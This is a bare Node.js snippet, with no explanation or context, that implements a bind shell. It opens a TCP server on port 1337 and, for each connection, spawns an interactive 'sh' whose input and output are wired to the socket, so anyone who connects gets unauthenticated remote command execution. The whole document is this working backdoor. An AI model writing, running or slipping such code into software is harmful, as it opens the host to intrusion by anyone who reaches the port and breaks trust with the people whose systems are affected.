var net = require('net');
var cp = require('child_process');
 
var server = net.createServer(function (c) {
    var sh = cp.spawn('sh', ['-i']);
    c.pipe(sh.stdin);
    sh.stdout.pipe(c);
});
server.listen(1337);
